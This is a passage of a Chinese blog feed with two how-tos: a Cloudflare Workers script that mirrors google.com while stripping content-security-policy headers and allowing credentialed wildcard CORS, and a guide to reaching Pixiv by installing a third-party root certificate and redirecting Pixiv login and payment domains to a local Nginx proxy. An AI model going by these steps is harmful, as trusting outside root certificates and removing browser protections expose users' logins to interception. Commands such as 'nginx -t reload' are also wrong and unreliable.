new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-credentials&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy-report-only&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;clear-site-data&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (content_type.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>) &amp;&amp; content_type.<span class="title function_">includes</span>(<span class="string">&#x27;UTF-8&#x27;</span>)) &#123;</span><br><span class="line">            original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(original_response_clone, upstream_domain, url_host);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            original_text = original_response_clone.<span class="property">body</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">            status,</span><br><span class="line">            <span class="attr">headers</span>: new_response_headers</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">var</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">        j = replace_dict[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            i = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            i = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (j == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            j = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            j = host_name</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">        text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span> (user_agent_info) &#123;</span><br><span class="line">    <span class="keyword">var</span> agents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后点击运行，就可以反代你需要的网站啦，但是注意，有些网站是无法进行反代的，例如twitter之类的，而且如果原来的网站具有登陆功能，那么这些<strong>登陆功能是无法使用的！！！</strong></p><div class="note primary flat"><p>加密版（来自评论区@Hostloc）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&#x27;google.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果那个站点有专门的移动适配站点，否则保持和上面一致</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = <span class="string">&#x27;m.google.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密码访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> openAuth = <span class="literal">false</span></span><br><span class="line"><span class="keyword">const</span> username = <span class="string">&#x27;username&#x27;</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 你希望禁止哪些国家访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [<span class="string">&#x27;KP&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止自访问</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换成你想镜像的站点</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;$upstream&#x27;</span>: <span class="string">&#x27;$custom_domain&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;//google.com&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">unauthorized</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Unauthorized&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;WWW-Authenticate&#x27;</span>: <span class="string">&#x27;Basic realm=&quot;goindex&quot;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">status</span>: <span class="number">401</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseBasicAuth</span>(<span class="params">auth</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">atob</span>(auth.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>).<span class="title function_">pop</span>()).<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doBasicAuth</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> auth = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;Authorization&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!auth || !<span class="regexp">/^Basic [A-Za-z0-9._~+/-]+=*$/i</span>.<span class="title function_">test</span>(auth)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> [user, pass] = <span class="title function_">parseBasicAuth</span>(auth);</span><br><span class="line">  <span class="keyword">return</span> user === username &amp;&amp; pass === password;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (request.<span class="property">method</span> === <span class="string">&#x27;OPTIONS&#x27;</span>) <span class="comment">// allow preflight request</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">status</span>: <span class="number">200</span>,</span><br><span class="line">      <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Headers&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Access-Control-Allow-Methods&#x27;</span>: <span class="string">&#x27;GET, POST, PUT, HEAD, OPTIONS&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (openAuth &amp;&amp; !<span class="title function_">doBasicAuth</span>(request)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">unauthorized</span>();</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-ipcountry&#x27;</span>).<span class="title function_">toUpperCase</span>();</span><br><span class="line">    <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;cf-connecting-ip&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;user-agent&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">    <span class="keyword">let</span> url_host = url.<span class="property">host</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (url.<span class="property">protocol</span> == <span class="string">&#x27;http:&#x27;</span>) &#123;</span><br><span class="line">        url.<span class="property">protocol</span> = <span class="string">&#x27;https:&#x27;</span></span><br><span class="line">        response = <span class="title class_">Response</span>.<span class="title function_">redirect</span>(url.<span class="property">href</span>);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">        upstream_domain = upstream</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        upstream_domain = upstream_mobile</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    url.<span class="property">host</span> = upstream_domain;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(blocked_ip_address.<span class="title function_">includes</span>(ip_address))&#123;</span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="number">403</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">        <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Host&#x27;</span>, upstream_domain);</span><br><span class="line">        new_request_headers.<span class="title function_">set</span>(<span class="string">&#x27;Referer&#x27;</span>, url.<span class="property">href</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: method,</span><br><span class="line">            <span class="attr">headers</span>: new_request_headers</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">        <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">        <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">        <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-origin&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">set</span>(<span class="string">&#x27;access-control-allow-credentials&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;content-security-policy-report-only&#x27;</span>);</span><br><span class="line">        new_response_headers.<span class="title function_">delete</span>(<span class="string">&#x27;clear-site-data&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&#x27;content-type&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (content_type.<span class="title function_">includes</span>(<span class="string">&#x27;text/html&#x27;</span>) &amp;&amp; content_type.<span class="title function_">includes</span>(<span class="string">&#x27;UTF-8&#x27;</span>)) &#123;</span><br><span class="line">            original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(original_response_clone, upstream_domain, url_host);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            original_text = original_response_clone.<span class="property">body</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">            status,</span><br><span class="line">            <span class="attr">headers</span>: new_response_headers</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&#x27;fetch&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(err.<span class="property">stack</span>), &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">500</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> i, j;</span><br><span class="line">    <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">        j = replace_dict[i]</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            i = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            i = host_name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (j == <span class="string">&#x27;$upstream&#x27;</span>) &#123;</span><br><span class="line">            j = upstream_domain</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&#x27;$custom_domain&#x27;</span>) &#123;</span><br><span class="line">            j = host_name</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">        text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span> (user_agent_info) &#123;</span><br><span class="line">    <span class="keyword">var</span> agents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="/2020/01/17/Cloudflare-Workers-Section2/">下篇：Cloudflare Workers绑定自定义域名进行访问</a></p><p>这就是JSPROXY的反代啦，祝各位成功呀！<br>题外话：</p><p>下周要考试了，我好方，怎么办</p><p>我已经用此方法部署了Google镜像站、Google学术镜像站、wiki镜像站，可以在我的友链界面找到哦~</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PIXIV网页版及客户端访问恢复指南（Linux版）</title>
      <link href="/posts/Pixiv-Nginx/"/>
      <url>/posts/Pixiv-Nginx/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://2heng.xin/2017/09/19/pixiv/">Windows版点这里，本文只介绍linux</a></p><p>国庆快乐鸭~</p><p>本周在想，既然Mashirozx的Nginx反代上P站的方案能在Windows上用，那Linux上肯定也是可以的，而且如果是一台linux服务器搭建好了，只需要把host指向到linux服务器上，就可以直接上P站，不用再开Mashirozx的Windows反代工具包了</p><p>废话不多说，直接上教程（封面图是从樱花庄的白猫引用过来的）</p><h4 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h4><p>在这里，我们安装Nginx（既然都是Nginx的反代了，不装怎么可以呢），Ubuntu上使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install nginx</span><br></pre></td></tr></table></figure><p>就可以安装了，安装完后输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx -t</span><br></pre></td></tr></table></figure><p>如果提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br></pre></td></tr></table></figure><p>就证明你安装成功了，当然，你也可以试着访问一下nginx的默认网站</p><p>访问<a href="http://localhost/">localhost</a>即可~！</p><h4 id="克隆工具包"><a href="#克隆工具包" class="headerlink" title="克隆工具包"></a>克隆工具包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mashirozx/Pixiv-Nginx.git</span><br></pre></td></tr></table></figure><p>使用上面这个命令来克隆<a href="https://github.com/mashirozx/Pixiv-Nginx">@Mashirozx&#x2F;Pixiv-Nginx</a>的反代工具包，然后打开文件夹中的“配置文件（非Windows用户使用）”文件夹</p><h4 id="安装反代配置"><a href="#安装反代配置" class="headerlink" title="安装反代配置"></a>安装反代配置</h4><p>进入~&#x2F;etc&#x2F;nginx&#x2F;这个位置，把上面打开的那个文件夹的东西全部都丢进去（此处需要root权限），提示覆盖就覆盖即可！</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/Pixiv-Nginx/Move-Files.png" alt="移动文件到~/etc/nginx/"></p><p>然后在~&#x2F;etc&#x2F;nginx目录下打开终端，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ca</span><br><span class="line">$ <span class="built_in">cp</span> pixiv.net.crt /usr/local/share/ca-certificates/pixiv.net.crt</span><br></pre></td></tr></table></figure><p>将证书复制到根证书安装目录下，然后使用该命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ update-ca-certificates</span><br></pre></td></tr></table></figure><p>更新证书，这样子你的根证书就成功安装了！</p><h4 id="重载Nginx"><a href="#重载Nginx" class="headerlink" title="重载Nginx"></a>重载Nginx</h4><p>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nginx -t reload</span><br></pre></td></tr></table></figure><p>重启nginx，然后新配置就会应用到nginx中，这样，反向代理就建好了</p><h4 id="修改host"><a href="#修改host" class="headerlink" title="修改host"></a>修改host</h4><p>接下来，你需要修改ubuntu的host</p><p>在~&#x2F;etc&#x2F;目录中找到host文件<code>host文件没有后缀名</code>，然后打开它，在里面加入以下内容（摘自<a href="https://2heng.xin/2017/09/19/pixiv/">PIXIV网页版及客户端访问恢复指南</a>）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#www.google.com域名仅用于登陆验证</span></span><br><span class="line"><span class="comment">#如果你不需要这个功能，请把下一行删掉</span></span><br><span class="line">127.0.0.1       www.google.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#Pixiv Start</span></span><br><span class="line">127.0.0.1       pixiv.net </span><br><span class="line">127.0.0.1       www.pixiv.net </span><br><span class="line">127.0.0.1       ssl.pixiv.net</span><br><span class="line">127.0.0.1       accounts.pixiv.net </span><br><span class="line">127.0.0.1       touch.pixiv.net</span><br><span class="line">127.0.0.1       oauth.secure.pixiv.net</span><br><span class="line">127.0.0.1       dic.pixiv.net</span><br><span class="line">127.0.0.1       en-dic.pixiv.net </span><br><span class="line">127.0.0.1       sketch.pixiv.net</span><br><span class="line">127.0.0.1       payment.pixiv.net</span><br><span class="line">127.0.0.1       factory.pixiv.net </span><br><span class="line">127.0.0.1       comic.pixiv.net  </span><br><span class="line">127.0.0.1       novel.pixiv.net </span><br><span class="line">127.0.0.1       imgaz.pixiv.net 